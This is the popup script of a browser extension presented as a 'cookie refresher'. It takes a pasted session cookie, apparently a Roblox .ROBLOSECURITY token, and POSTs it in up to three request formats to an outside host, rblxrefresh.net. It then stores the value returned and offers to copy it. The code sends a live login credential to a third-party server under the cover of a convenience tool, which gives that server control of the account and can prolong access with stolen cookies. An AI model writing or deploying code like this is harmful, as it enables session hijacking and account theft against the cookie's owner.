const $ = (id) => document.getElementById(id);

const cookieEl = $("cookie");
const outEl = $("output");
const statusEl = $("status");
const btn = $("refresh-btn");
const copyBtn = $("copy-btn");

// Restore last input
chrome.storage.local.get(["lastCookie", "lastOutput"], (v) => {
  if (v.lastCookie) cookieEl.value = v.lastCookie;
  if (v.lastOutput) outEl.value = v.lastOutput;
});

function setStatus(msg, kind) {
  statusEl.textContent = msg;
  statusEl.className = "status " + (kind || "");
}

async function refreshCookie(raw) {
  // Try a couple of common request shapes; return first refreshed cookie we find.
  const attempts = [
    {
      url: "https://rblxrefresh.net/api/refresh",
      init: {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cookie: raw }),
      },
    },
    {
      url: "https://rblxrefresh.net/refresh",
      init: {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cookie: raw }),
      },
    },
    {
      url: "https://rblxrefresh.net/api/refresh",
      init: {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "cookie=" + encodeURIComponent(raw),
      },
    },
  ];

  let lastErr = null;
  for (const a of attempts) {
    try {
      const res = await fetch(a.url, a.init);
      const text = await res.text();
      if (!res.ok) { lastErr = `HTTP ${res.status}: ${text.slice(0,120)}`; continue; }
      let refreshed = null;
      try {
        const j = JSON.parse(text);
        refreshed = j.cookie || j.refreshed || j.result || j.data || j.newCookie || null;
        if (!refreshed && typeof j === "string") refreshed = j;
      } catch {
        refreshed = text.trim();
      }
      if (refreshed && String(refreshed).includes("_|WARNING")) return String(refreshed);
      if (refreshed) return String(refreshed);
      lastErr = "No cookie in response";
    } catch (e) {
      lastErr = e.message;
    }
  }
  throw new Error(lastErr || "Refresh failed");
}

btn.addEventListener("click", async () => {
  const raw = cookieEl.value.trim();
  if (!raw) { setStatus("Enter a cookie first.", "err"); return; }
  btn.disabled = true;
  setStatus("Beaming request through the web...", "");
  try {
    const refreshed = await refreshCookie(raw);
    outEl.value = refreshed;
    chrome.storage.local.set({ lastCookie: raw, lastOutput: refreshed });
    setStatus("Refreshed! Web-slinger success.", "ok");
  } catch (e) {
    setStatus("Failed: " + e.message, "err");
  } finally {
    btn.disabled = false;
  }
});

copyBtn.addEventListener("click", async () => {
  if (!outEl.value) return;
  await navigator.clipboard.writeText(outEl.value);
  setStatus("Copied to clipboard.", "ok");
});
